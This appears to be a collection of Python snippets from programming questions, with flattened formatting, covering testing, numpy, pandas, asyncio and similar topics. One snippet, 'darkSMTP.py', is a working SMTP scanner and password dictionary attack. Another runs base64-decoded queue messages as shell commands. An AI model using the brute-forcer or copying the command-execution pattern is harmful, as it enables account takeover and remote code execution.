"import unittestfrom IPython.display import Markdown , displaydef printmd ( string ) : display ( Markdown ( string ) ) class Tests ( unittest.TestCase ) : def check_add_2 ( self , add_2 ) : val = 5 self.assertAlmostEqual ( add_2 ( val ) , 7 ) def check_add_n ( self , add_n ) : n = 6 val = 5 self.assertAlmostEqual ( add_n ( val ) , 11 ) check = Tests ( ) def run_check ( check_name , func , hint=False ) : try : getattr ( check , check_name ) ( func ) except check.failureException as e : printmd ( '** < span style= '' color : red ; '' > FAILED < /span > ** ' ) if hint : print ( 'Hint : ' , e ) return printmd ( '** < span style= '' color : green ; '' > PASSED < /span > ** ' ) In [ 1 ] : def add_2 ( val ) : return val + 2In [ 2 ] : def add_n ( val ) : return val + nIn [ 3 ] : import test_checksIn [ 4 ] : test_checks.run_check ( 'check_add_2 ' , add_2 ) PASSEDIn [ 5 ] : test_checks.run_check ( 'check_add_n ' , add_n ) ! ! ! ERROR ! ! ! In [ 6 ] : def add_n ( val , default_n=None ) : if default_n : n = default_n return val + n def check_add_n ( self , add_n ) : val = 5 self.assertAlmostEqual ( add_n ( val , 6 ) , 11 )"
"def fix ( line ) : `` '' '' returns the corrected line , with all apostrophes prefixed by an escape character > > > fix ( 'DOUG\'S ' ) 'DOUG\\\ 'S ' `` '' '' if '\ '' in line : return line.replace ( '\ '' , '\\\ '' ) return line Failed example : fix ( 'DOUG'S ' ) Exception raised : Traceback ( most recent call last ) : File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/doctest.py '' , line 1254 , in __run compileflags , 1 ) in test.globs File `` < doctest convert.fix [ 0 ] > '' , line 1 fix ( 'DOUG'S ' ) ^"
"ipdb.set_trace ( ) object.method ? *** SyntaxError : invalid syntax ( < stdin > , line 1 ) help ( object.method ) *** No help on ( object.method )"
"class Account ( object ) : def __init__ ( self , name , balance ) : self.name = name self.balance = balance self.observers = set ( ) def __del__ ( self ) : for ob in self.observers : ob.close ( ) del self.observers def register ( self , observer ) : self.observers.add ( observer ) def unregister ( self , observer ) : self.observers.remove ( observer ) def notify ( self ) : for ob in self.observers : ob.update ( ) def withdraw ( self , amt ) : self.balance -= amt self.notify ( ) class AccountObserver ( object ) : def __init__ ( self , theaccount ) : self.theaccount = theaccount theaccount.register ( self ) def __del__ ( self ) : self.theaccount.unregister ( self ) del self.theaccount def update ( self ) : print ( `` Balance is % 0.2f '' % self.theaccount.balance ) def close ( self ) : print ( `` Account no longer in use '' ) # Example setupa = Account ( 'Dave',1000.00 ) a_ob = AccountObserver ( a )"
"import numpy as npd = np.array ( [ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 ] ) > > import scipy.ndimage.filters as filt > > res = filt.uniform_filter ( d , size=4 ) > > print res [ 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ]"
"import json , time # this will allow to see what happens when we import a libraryprint ( json.dumps ( { 'key ' : 'hello world ' } ) ) time.sleep ( 3 ) print ( 1/0 ) # division error ! cython test.pyx -- embed call `` C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' x64cl test.c /I C : \Python37\include /link C : \Python37\libs\python37.lib Traceback ( most recent call last ) : File `` test.pyx '' , line 4 , in init test print ( 1/0 ) # division error ! < -- the source code and even the comments are still there ! ZeroDivisionError : integer division or modulo by zero"
"import numpy as np # load_data : def load_data ( ) : data_one = np.load ( '/Users/usr/ ... file_name.npy ' ) list_of_tuples = [ ] for x , y , label in data_one : list_of_tuples.append ( ( x , y ) ) return list_of_tuplesprint load_data ( ) import numpy as np # load_data : def load_data ( ) : data_one = np.load ( '/Users/usr ... . file_name.npy ' ) list_of_tuples = [ ( x , y ) for x , y , label in data_one ] return list_of_tuplesprint load_data ( )"
"from distutils.core import setup , Extensionsetup ( name='mymodule ' , version= ' 1.0 ' , author='Me ' , ext_modules= [ Extension ( 'mymodule ' , [ 'mymodule-module.c ' ] ) , Extension ( 'bar ' , [ 'bar-module.c ' ] ) ] ) from distutils.core import setup , ExtensionPACKAGE_NAME = 'mymodule'setup ( name=PACKAGE_NAME , version= ' 1.0 ' , author='Me ' , packages= [ PACKAGE_NAME ] , ext_package=PACKAGE_NAME ext_modules= [ Extension ( 'foo ' , [ 'mymodule-foo-module.c ' ] ) , Extension ( 'bar ' , [ 'mymodule-bar-module.c ' ] ) ] )"
"def __getattr__ ( self , attr ) : try : return self.props [ attr ] .value except KeyError : pass # to hide the keyerror exception msg = `` ' { } ' object has no attribute ' { } ' '' raise AttributeError ( msg.format ( self.__dict__ [ 'type ' ] , attr ) ) t = Thing ( ) t.foo Traceback ( most recent call last ) : File `` attrfun.py '' , line 23 , in < module > t.foo File `` attrfun.py '' , line 15 , in __getattr__ raise AttributeError ( msg.format ( self._type , attr ) ) AttributeError : 'Thing ' object has no attribute 'foo ' Traceback ( most recent call last ) : File `` attrfun.py '' , line 23 , in < module > t.fooAttributeError : 'Thing ' object has no attribute 'foo '"
# Test if rawinput writes to stdout or stderrraw_input ( 'This is my prompt > ' ) $ python test_raw_input.py > xxx $ python test_raw_input.py 2 > xxx
g = globals ( ) g [ `` foo '' ] = `` bar '' print foo # Works and outputs `` bar ''
"parts = re.split ( r'\s* ' , re.sub ( r'^\s+|\s* $ ' , `` , expression ) ) # split expression into 5 parts ' a * b = c ' will be split into [ ' a ' , '* ' , ' b ' , '= ' , ' c ' ] , '11 + 12 = 23 ' will be split into [ '11 ' , '+ ' , '12 ' , '= ' , '23 ' ] , 'ab - c = d ' will be split into [ 'ab ' , '- ' , ' c ' , '= ' , 'd ' ] , ' a * b = c ' will be split into [ `` , ' a ' , '' , '* ' , `` , ' b ' , '' , '= ' , `` , ' c ' , `` ] , '11 + 12 = 23 ' will be split into [ `` , ' 1 ' , ' 1 ' , `` , '+ ' , `` , ' 1 ' , ' 2 ' , `` , '= ' , `` , ' 2 ' , ' 3 ' , `` ] , 'ab - c = d ' will be split into [ `` , ' a ' , ' b ' , `` , '- ' , `` , ' c ' , `` , '= ' , `` , 'd ' , `` ] ,"
"from distutils.core import setupimport os , sysimport matplotlib as mpl # Find where matplotlib stores its True Type fontsmpl_data_dir = os.path.dirname ( mpl.matplotlib_fname ( ) ) mpl_ttf_dir = os.path.join ( mpl_data_dir , 'fonts ' , 'ttf ' ) setup ( ... ( edited for brevity ) ... install_requires = [ 'matplotlib > = 1.4.0 , ! =1.4.3 ' , 'numpy > = 1.6 ' ] , data_files = [ ( mpl_ttf_dir , [ './font_files/TeXGyreHeros-txfonts/TeXGyreHerosTXfonts-Regular.ttf ' ] ) , ( mpl_ttf_dir , [ './font_files/TeXGyreHeros-txfonts/TeXGyreHerosTXfonts-Italic.ttf ' ] ) ] ) # Try to delete matplotlib 's fontList cachempl_cache_dir = mpl.get_cachedir ( ) mpl_cache_dir_ls = os.listdir ( mpl_cache_dir ) if 'fontList.cache ' in mpl_cache_dir_ls : fontList_path = os.path.join ( mpl_cache_dir , 'fontList.cache ' ) os.remove ( fontList_path )"
"skimage.util.view_as_blocks ( arr_in , block_shape ) array ( [ [ 0 , 1 , 2 , 3 ] , [ 4 , 5 , 6 , 7 ] , [ 8 , 9 , 10 , 11 ] , [ 12 , 13 , 14 , 15 ] ] ) > > > B = view_as_blocks ( A , block_shape= ( 2 , 2 ) ) > > > B [ 0 , 0 ] array ( [ [ 0 , 1 ] , [ 4 , 5 ] ] ) > > > B [ 0 , 1 ] array ( [ [ 2 , 3 ] , [ 6 , 7 ] ] )"
class Class : pass
time A B2017-10-26 09:00:00 36 8162017-10-26 10:45:00 43 8162017-10-26 12:30:00 50 9982017-10-26 12:45:00 51 7502017-10-26 13:00:00 52 9982017-10-26 13:15:00 53 9982017-10-26 13:30:00 54 9982017-10-26 14:00:00 56 9982017-10-26 14:15:00 57 8342017-10-26 14:30:00 58 12852017-10-26 14:45:00 59 12882017-10-26 23:45:00 95 12852017-10-27 03:00:00 12 12852017-10-27 03:30:00 14 1285 ... 2017-11-02 14:00:00 56 9982017-11-02 14:15:00 57 9982017-11-02 14:30:00 58 9982017-11-02 14:45:00 59 9982017-11-02 15:00:00 60 8162017-11-02 15:15:00 61 2752017-11-02 15:30:00 62 2252017-11-02 15:45:00 63 12882017-11-02 16:00:00 64 10882017-11-02 18:15:00 73 12852017-11-02 20:30:00 82 12852017-11-02 21:00:00 84 10882017-11-02 21:15:00 85 10882017-11-02 21:30:00 86 10882017-11-02 22:00:00 88 10882017-11-02 22:30:00 90 10882017-11-02 23:00:00 92 10882017-11-02 23:30:00 94 10882017-11-02 23:45:00 95 1088 B -- -- -- -- -- -- -- -- -1088 -- -- -- 1288 -- -- -- -- -- -- -- -- -- -- -- -- -- -- B ..1088 8 2 ... .. Number of transitions between them ... ..
"import picklefrom nltk.parse.stanford import StanfordDependencyParserparser = StanfordDependencyParser ( 'stanford-parser-full-2015-12-09/stanford-parser.jar ' , 'stanford-parser-full-2015-12-09/stanford-parser-3.6.0-models.jar ' ) sentences = [ `` I am going there '' , '' I am asking a question '' ] with open ( `` save.p '' , '' wb '' ) as f : pickle.dump ( parser.raw_parse_sents ( sentences ) , f ) AttributeError : Ca n't pickle local object 'DependencyGraph.__init__. < locals > . < lambda > '"
"# ! /usr/bin/env python import pika import commands import socket import base64 connection = pika.BlockingConnection ( pika.ConnectionParameters ( host='localhost ' ) ) channel = connection.channel ( ) channel.queue_declare ( queue='rpc_queue ' ) def on_request ( ch , method , props , body ) : # print body body = base64.b64decode ( body ) print body run = commands.getoutput ( body ) response = socket.gethostname ( ) print response ch.basic_publish ( exchange= '' , routing_key=props.reply_to , properties=pika.BasicProperties ( correlation_id = \ props.correlation_id ) , body=str ( response ) ) ch.basic_ack ( delivery_tag = method.delivery_tag ) channel.basic_qos ( prefetch_count=1 ) channel.basic_consume ( on_request , queue='rpc_queue ' ) print `` [ x ] Awaiting RPC requests '' channel.start_consuming ( )"
class Color ( Enum ) : red = 1 green = 2 blue = 3
"signs = { `` + '' : lambda a , b : a + b , `` - '' : lambda a , b : a - b } a = 5b = 3for i in signs.keys ( ) : print ( signs [ i ] ( a , b ) ) 82"
"class Meta ( type ) : def __call__ ( self ) : print ( `` Meta __call__ '' ) super ( Meta , self ) .__call__ ( ) def __new__ ( mcs , name , bases , attrs , **kwargs ) : print ( `` Meta __new__ '' ) return super ( ) .__new__ ( mcs , name , bases , kwargs ) def __prepare__ ( msc , name , **kwargs ) : print ( `` Meta __prepare__ '' ) return { } class SubMeta ( Meta ) : def __call__ ( self ) : print ( `` SubMeta __call__ ! '' ) super ( ) .__call__ ( ) def __new__ ( mcs , name , bases , attrs , **kwargs ) : print ( `` SubMeta __new__ '' ) return super ( ) .__new__ ( mcs , name , bases , kwargs ) def __prepare__ ( msc , name , **kwargs ) : print ( `` SubMeta __prepare__ '' ) return Meta.__prepare__ ( name , kwargs ) class B ( metaclass = SubMeta ) : passb = B ( ) SubMeta __prepare__Meta __prepare__SubMeta __new__Meta __new__SubMeta __call__ ! Meta __call__"
"class ParseError ( Exception ) : passdef safe_slice ( data , start , end ) : `` '' '' 0 < = start < = end is assumed '' '' '' r = data [ start : end ] if len ( r ) ! = end - start : raise IndexError return rdef lazy_parse ( data ) : `` '' '' extract ( name , phone ) from a data buffer . If the buffer could not be parsed , a ParseError is raised. `` '' '' try : name_length = ord ( data [ 0 ] ) extracted_name = safe_slice ( data , 1 , 1 + name_length ) phone_length = ord ( data [ 1 + name_length ] ) extracted_phone = safe_slice ( data , 2 + name_length , 2 + name_length + phone_length ) except IndexError : raise ParseError ( ) return extracted_name , extracted_phoneif __name__ == '__main__ ' : print lazy_parse ( `` \x04Jack\x0A0123456789 '' ) # OK print lazy_parse ( `` \x04Jack\x0A012345678 '' ) # should raise ParseError"
"449319.34 ; 6242700.23 ; 0.38 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 25 ; 3 ; 17 ; 482375.326087 ; 20224 ; 23808 ; 23808449310.72 ; 6242700.22 ; 0.35 ; 3 ; 1 ; 1 ; 0 ; 0 ; 42 ; 23 ; 3 ; 17 ; 482375.334291 ; 20480 ; 24576 ; 24576449313.81 ; 6242700.66 ; 0.39 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 24 ; 3 ; 17 ; 482375.342666 ; 20224 ; 24576 ; 24576449298.37 ; 6242700.27 ; 0.39 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 21 ; 3 ; 17 ; 482375.350762 ; 18176 ; 22784 ; 23552449287.47 ; 6242700.06 ; 0.39 ; 11 ; 1 ; 1 ; 0 ; 0 ; 42 ; 20 ; 3 ; 17 ; 482375.358921 ; 20736 ; 24832 ; 24832449290.11 ; 6242700.21 ; 0.35 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 20 ; 3 ; 17 ; 482375.358962 ; 19968 ; 24064 ; 23808449280.48 ; 6242700.08 ; 0.33 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 18 ; 3 ; 17 ; 482375.367142 ; 22528 ; 25856 ; 26624449286.97 ; 6242700.44 ; 0.36 ; 3 ; 1 ; 1 ; 0 ; 0 ; 42 ; 19 ; 3 ; 17 ; 482375.367246 ; 19712 ; 23552 ; 23296449293.03 ; 6242700.78 ; 0.37 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 21 ; 3 ; 17 ; 482375.367342 ; 19456 ; 23296 ; 23808449313.36 ; 6242701.92 ; 0.38 ; 6 ; 1 ; 1 ; 0 ; 0 ; 42 ; 24 ; 3 ; 17 ; 482375.367654 ; 19968 ; 24576 ; 24576449277.48 ; 6242700.17 ; 0.34 ; 8 ; 1 ; 1 ; 0 ; 0 ; 42 ; 18 ; 3 ; 17 ; 482375.375420 ; 20224 ; 23808 ; 25088449289.46 ; 6242700.85 ; 0.31 ; 3 ; 1 ; 1 ; 0 ; 0 ; 42 ; 20 ; 3 ; 17 ; 482375.375611 ; 18944 ; 23040 ; 23040 20 ; 10 ; 449319.34 ; 6242700.23 ; 0.38 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 25 ; 3 ; 17 ; 482375.326087 ; 20224 ; 23808 ; 23808 20 ; 10 ; 449310.72 ; 6242700.22 ; 0.35 ; 3 ; 1 ; 1 ; 0 ; 0 ; 42 ; 23 ; 3 ; 17 ; 482375.334291 ; 20480 ; 24576 ; 24576 20 ; 10 ; 449313.81 ; 6242700.66 ; 0.39 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 24 ; 3 ; 17 ; 482375.342666 ; 20224 ; 24576 ; 24576 20 ; 10 ; 449298.37 ; 6242700.27 ; 0.39 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 21 ; 3 ; 17 ; 482375.350762 ; 18176 ; 22784 ; 23552 20 ; 11 ; 449287.47 ; 6242700.06 ; 0.39 ; 11 ; 1 ; 1 ; 0 ; 0 ; 42 ; 20 ; 3 ; 17 ; 482375.358921 ; 20736 ; 24832 ; 24832 20 ; 11 ; 449290.11 ; 6242700.21 ; 0.35 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 20 ; 3 ; 17 ; 482375.358962 ; 19968 ; 24064 ; 23808 20 ; 10 ; 449313.81 ; 6242700.66 ; 0.39 ; 1 ; 1 ; 1 ; 0 ; 0 ; 42 ; 24 ; 3 ; 17 ; 482375.342666 ; 20224 ; 24576 ; 24576 20 ; 11 ; 449287.47 ; 6242700.06 ; 0.39 ; 11 ; 1 ; 1 ; 0 ; 0 ; 42 ; 20 ; 3 ; 17 ; 482375.358921 ; 20736 ; 24832 ; 24832 # File : readline-example-3.pyfile = open ( `` sample.txt '' ) while 1 : lines = file.readlines ( 100000 ) if not lines : break for line in lines : pass # do something from __future__ import divisionimport osimport globimport tempfileimport sysdef print_flulsh ( n , maxvalue = None ) : sys.stdout.write ( `` \r '' ) if maxvalue is None : sys.stdout.write ( `` Laser points processed : % d '' % n ) else : sys.stdout.write ( `` % d of % d laser points processed '' % ( n , maxvalue ) ) sys.stdout.flush ( ) def point_grid_id ( x , y , minx , maxy , size ) : `` '' '' give id ( row , col ) '' '' '' col = int ( ( x - minx ) / size ) row = int ( ( maxy - y ) / size ) return row , coldef tempfile_tile_name ( line , temp_dir , minx , maxy , size , parse ) : x , y = line.split ( parse ) [ :2 ] row , col = point_grid_id ( float ( x ) , float ( y ) , minx , maxy , size ) return os.path.normpath ( os.path.join ( temp_dir + os.sep , '' tempfile_ % s_ % s.tmp '' % ( row , col ) ) ) # split the text file in small text files following the ID value given by tempfile_tile_name # where : # filename : name+path of text file # temp_dir : temporary folder # minx , maxy : origin of the grid ( left-up corner ) # size : size of the grid # parse : delimeter of the text file # num : number of lines ( ~ 12 millions ) def tempfile_split ( filename , temp_dir , minx , maxy , size , parse , num ) : index = 1 with open ( filename ) as file : while True : lines = file.readlines ( 100000 ) if not lines : break for line in lines : print_flulsh ( index , num ) index += 1 name = tempfile_tile_name ( line , temp_dir , minx , maxy , size , parse ) with open ( name , ' a ' ) as outfile : outfile.write ( line )"
"class Point : def __init__ ( self , x , y ) : self.x , self.y = x , y def __repr__ ( self ) : return 'Point ( x= % s , y= % s ) ' % ( self.x , self.y ) def print_class ( self ) : return 'Point ( x= % s , y= % s ) ' % ( self.x , self.y ) p = Point ( 1,2 ) print pprint p.print_class ( ) Point ( x=1 , y=2 ) Point ( x=1 , y=2 )"
"test1 = pd.DataFrame ( { 'id_A ' : [ 'Ben ' , 'Julie ' , 'Jack ' , 'Jack ' ] , 'id_B ' : [ 'Julie ' , 'Ben ' , 'Nina ' , 'Julie ' ] } ) test2 = pd.DataFrame ( { 'id_a ' : [ 'Ben ' , 'Ben ' , 'Ben ' , 'Julie ' , 'Julie ' , 'Nina ' ] , 'id_b ' : [ 'Julie ' , 'Nina ' , 'Jack ' , 'Nina ' , 'Jack ' , 'Jack ' ] , 'value ' : [ 1,1,0,0,1,0 ] } ) > > > test1 id_A id_B0 Ben Julie1 Julie Ben2 Jack Nina3 Jack Julie > > > test2 id_a id_b value0 Ben Julie 11 Ben Nina 12 Ben Jack 03 Julie Nina 04 Julie Jack 15 Nina Jack 0 > > > final_df id_A id_B value0 Ben Julie 11 Julie Ben 12 Jack Nina 03 Jack Julie 1 test3 = pd.concat ( [ test2 , test2.rename ( columns = { 'id_a ' : 'id_b ' , 'id_b ' : 'id_a ' } ) ] ) final_df = ( test1.merge ( test3 , left_on = [ 'id_A ' , 'id_B ' ] , right_on = [ 'id_a ' , 'id_b ' ] ) .drop ( [ 'id_a ' , 'id_b ' ] , axis=1 ) )"
"% matplotlib inlineimport numpy as npimport matplotlib.pyplot as pltimport randomimport mayavifrom mayavi import mlabN = 4 ; diams = .4*np.ones ( [ N ] ) ; xvals = np.arange ( N ) ; yvals = np.zeros ( N ) ; zvals = np.zeros ( N ) ; pts = mlab.points3d ( xvals , yvals , zvals , diams , scale_factor=1 , transparent=True ) mlab.show ( )"
event_type=event_type=str ( payload_json [ 'event ' ] ) a=b=c=d=10 a=10b=10c=10d=10
"import asynciodef schedule_something ( ) : global f tsk = asyncio.async ( do_something ( ) ) f = tsk # If this line is commented out , exceptions can be heard . @ asyncio.coroutinedef do_something ( ) : raise Exception ( ) loop = asyncio.get_event_loop ( ) loop.call_soon ( schedule_something ) loop.run_forever ( ) loop.close ( )"
SomeClass ( some_ctor_arguments ) .some_method ( ) ` > > > import pdb > > > import < some-package > > > > pdb.run ( ... . ) > < string > ( 1 ) < module > ( ) ( Pdb ) sNameError : `` name ' < some-package > ' is not defined ''
"Traceback ( most recent call last ) : File `` /home/user/Desktop/darkSMTP.py '' , line 133 , in < module > thread = myThread ( i , `` Thread `` + str ( i ) , i ) ; File `` /home/user/Desktop/darkSMTP.py '' , line 100 , in __init__ self.name = name File `` /usr/lib/python2.6/threading.py '' , line 669 , in name assert self.__initialized , `` Thread.__init__ ( ) not called '' AssertionError : Thread.__init__ ( ) not called import threading , time , random , sys , smtplib , socketfrom smtplib import SMTPfrom copy import copyfrom optparse import OptionParser usage= `` ./ % prog -i < iplist > -t < threads > -u < userlist > -p < passlist > '' usage = usage+ '' \nExample : ./ % prog -i ips.txt -t 8 -u user.txt -p pass.txt '' parser = OptionParser ( usage=usage ) parser.add_option ( `` -i '' , action= '' store '' , dest= '' ips '' , help= '' IP list for scanning '' ) parser.add_option ( `` -t '' , type= '' int '' , action= '' store '' , dest= '' threads '' , help= '' Threads for processing '' ) parser.add_option ( `` -u '' , action= '' store '' , dest= '' users '' , help= '' List of usernames '' ) parser.add_option ( `` -p '' , action= '' store '' , dest= '' passes '' , help= '' List of passwords '' ) ( options , args ) = parser.parse_args ( ) def timer ( ) : now = time.localtime ( time.time ( ) ) return time.asctime ( now ) if len ( sys.argv ) ! = 9 : parser.print_help ( ) sys.exit ( 1 ) i = 1port = 25threads = options.threadsfile = options.ipsusers = options.userspasses = options.passescompleted = [ ] threaders = [ ] logger = open ( 'darkSMTP.txt ' , ' w ' ) ipfile = open ( file , ' r ' ) print `` [ + ] Warming up ... ok '' ; lines = ipfile.readlines ( ) print `` [ + ] IP 's loaded : '' , len ( lines ) ; print `` [ + ] Users loaded : '' , len ( users ) print `` [ + ] Passwords loaded : '' , len ( passes ) ipfile.close ( ) ; eachThread = len ( lines ) / int ( threads ) ; print `` [ + ] IP 's per thread : '' , eachThread ; class myThread ( threading.Thread ) : def __init__ ( self , threadID , name , counter ) : self.threadID = threadID self.name = name self.counter = counter threading.Thread.__init__ ( self ) def run ( self ) : print `` [ + ] Starting `` + self.name connect ( self.name , self.counter , eachThread , self.threadID ) def connect ( threadName , delay , counter , threadID ) : start = threadID * counter file = open ( options.ips , ' r ' ) data = file.readlines ( ) while counter : if 0 : thread.exit ( ) s=socket.socket ( socket.AF_INET , socket.SOCK_STREAM ) s.settimeout ( 2 ) try : connect=s.connect ( ( data [ start-counter ] , port ) ) print `` [ + ] SMTP server on : `` + data [ start-counter ] , print `` [ + ] Server added to output file ! '' logger.write ( data [ start-counter ] ) if s.recv ( 1024 ) : completed.append ( data [ start-counter ] .rstrip ( ) ) except socket.timeout : print `` [ - ] Server non-existant : `` + data [ start-counter ] .rstrip ( ) except socket.error : print `` [ + ] Server exists ! `` + data [ start-counter ] .rstrip ( ) ; print `` [ - ] But it 's not SMTP '' s.close ( ) time.sleep ( delay ) counter -= 1while ( i < int ( threads + 1 ) ) : thread = myThread ( i , `` Thread `` + str ( i ) , i ) ; threaders.append ( thread ) i += 1 thread.start ( ) for t in threaders : t.join ( ) print `` \n -- - Found & logged all SMTP servers in range -- -\n '' print `` -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - '' print `` [ + ] Starting dictionary attack for each SMTP server '' print `` -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -\n '' try : helo = smtplib.SMTP ( sys.argv [ 1 ] ) name = helo.helo ( ) helo.quit ( ) except ( socket.gaierror , socket.error , socket.herror , smtplib.SMTPException ) : name = `` [ - ] Server does n't support the Helo cmd '' try : users = open ( users , `` r '' ) .readlines ( ) except ( IOError ) : print `` Error : Check your userlist path\n '' sys.exit ( 1 ) try : words = open ( passes , `` r '' ) .readlines ( ) except ( IOError ) : print `` Error : Check your wordlist path\n '' sys.exit ( 1 ) wordlist = copy ( words ) def reloader ( ) : for word in wordlist : words.append ( word ) def getword ( ) : lock = threading.Lock ( ) lock.acquire ( ) if len ( words ) ! = 0 : value = random.sample ( words , 1 ) words.remove ( value [ 0 ] ) else : reloader ( ) value = random.sample ( words , 1 ) words.remove ( value [ 0 ] ) users.remove ( users [ 0 ] ) lock.release ( ) return value [ 0 ] [ : -1 ] , users [ 0 ] [ : -1 ] class Worker ( threading.Thread ) : def __init__ ( self ) : threading.Thread.__init__ ( self ) def run ( self ) : value , user = getword ( ) for ip in completed : print `` - '' *12 print `` [ + ] IP : `` +ip try : print `` User : '' , user , '' Password : '' , value smtp = smtplib.SMTP ( ip ) smtp.login ( user , value ) print `` \t\n [ ! ] Login successful : '' , user , value logger.write ( `` [ ! ] Found : `` + ip + `` `` + str ( user ) + `` : '' + str ( value ) + `` \n '' ) smtp.quit ( ) sys.exit ( 2 ) except ( socket.gaierror , socket.error , socket.herror , smtplib.SMTPException ) , msg : passfor i in range ( len ( words ) *len ( users ) ) : work = Worker ( ) work.start ( ) threaders.append ( work ) time.sleep ( 1 ) for t in threaders : t.join ( ) logger.close ( )"
"import numpy as npfrom PIL import Imagenp.random.seed ( 0 ) img_arrays = np.random.random ( ( 100 , 256 , 256 , 3 ) ) * 255for i , img_array in enumerate ( img_arrays ) : img = Image.fromarray ( img_array , `` RGB '' ) img.save ( `` { } .png '' .format ( i ) )"
"servo_in_position second_servo_in_position Expected output0 0 1 01 0 1 02 1 2 13 0 3 04 1 4 25 1 4 26 0 5 07 0 5 08 1 6 39 0 7 010 1 8 411 0 9 012 1 10 513 1 10 514 1 10 515 0 11 016 0 11 017 0 11 018 1 12 619 1 12 620 0 13 021 0 13 022 0 13 0 input_data [ 'second_servo_in_position ' ] = ( input_data.servo_in_position.diff ( ) ! =0 ) .cumsum ( ) print ( `` Mean=\n\n '' , input_data.groupby ( 'second_servo_in_position ' ) .mean ( ) )"
"import numpy as npa = np.arange ( 12 ) .reshape ( ( 3 , -1 ) ) inds = np.array ( [ 1 , 2 ] ) print ( np.take ( a , inds , axis=1 ) ) [ [ 1 2 ] [ 5 6 ] [ 9 10 ] ] np.take ( a , inds , axis=1 ) = 0print ( a )"
"df1 = pd.DataFrame ( { ' a ' : [ 1,2,3,4 ] , ' b ' : [ 5,6,7,8 ] } ) print ( df1 ) a b0 1 51 2 62 3 73 4 8df2 = pd.DataFrame ( { ' a ' : [ ' A ' , ' B ' , ' A ' , ' B ' ] , ' b ' : [ ' A ' , ' A ' , ' B ' , ' B ' ] } ) print ( df2 ) a b0 A A1 B A2 A B3 B B a b0 4 111 6 112 4 153 6 15"
"import cProfileimport recProfile.run ( 're.compile ( `` foo|bar '' ) ' , 'restats ' ) import pstatsp = pstats.Stats ( 'restats ' ) p.strip_dirs ( ) .sort_stats ( -1 ) .print_stats ( ) In [ ] : cProfile.run ( 're.compile ( `` foo|bar '' ) 'Out [ ] :"
"import asyncioimport aiohttpclass MySession : def __init__ ( self ) : self.session = None async def __aenter__ ( self ) : async with aiohttp.ClientSession ( ) as session : self.session = session return self async def __aexit__ ( self , exc_type , exc_val , exc_tb ) : if self.session : await self.session.close ( ) async def method1 ( ) : async with MySession ( ) as s : async with s.session.get ( `` https : //www.google.com '' ) as resp : if resp.status == 200 : print ( `` successful call ! `` ) loop = asyncio.get_event_loop ( ) loop.run_until_complete ( method1 ( ) ) loop.close ( ) async def __aenter__ ( self ) : self.session = aiohttp.ClientSession ( ) return self"
+ -- -- -- -- -+ -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+|type |number |old number |difference | % documented | % badname |+=========+=======+===========+===========+============+=========+|module |1 |1 |= |100.00 |0.00 |+ -- -- -- -- -+ -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+|class |3 |3 |= |100.00 |0.00 |+ -- -- -- -- -+ -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+|method |27 |27 |= |100.00 |0.00 |+ -- -- -- -- -+ -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+|function |2 |2 |= |100.00 |0.00 |+ -- -- -- -- -+ -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -++ -- -- -- -- -- + -- -- -- -+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+|type |number | % |previous |difference |+==========+=======+======+=========+===========+|code |266 |24.98 |266 |= |+ -- -- -- -- -- + -- -- -- -+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+|docstring |747 |70.14 |747 |= |+ -- -- -- -- -- + -- -- -- -+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+|comment |41 |3.85 |41 |= |+ -- -- -- -- -- + -- -- -- -+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+|empty |11 |1.03 |11 |= |+ -- -- -- -- -- + -- -- -- -+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+
.. myDirective : : name : opt1 : val content ..tabbedInterface : : .. myDirective : : name1 : op1 : val1 content .. myDirective : : name2 : op1 : val1 content
"q = -0.2461 2.9531 -15.8867 49.8750 -99.1172 125.8438 -99.1172 49.8750 -15.8867 2.9531 -0.2461 import numpy as npq = np.sort ( np.roots ( q ) ) [ 0.26937874-0.35469815j 0.26937874+0.35469815j 0.33711562-0.15638427j 0.33711562+0.15638427j 0.35254298+0.j 1.35792218-1.78801226j 1.35792218+1.78801226j 2.44104520-1.13237431j 2.44104520+1.13237431j 2.83653354+0.j ] def sortComplex ( complexList ) : complexList.sort ( key=abs ) # then sort by the angles , swap those in descending orders return complexList"
"public long randomLong ( ) { x ^= ( x < < 21 ) ; x ^= ( x > > > 35 ) ; x ^= ( x < < 4 ) ; return x ; } 356516011130297953386881-9204155794254196429144132848981442561 def randomLong ( self ) : self.x ^= np.left_shift ( self.x , 21 ) self.x ^= np.right_shift ( self.x , 35 ) self.x ^= np.left_shift ( self.x , 4 ) return self.x 356516011130297953386881-9204155787274874573 # different143006948545953793 # different"
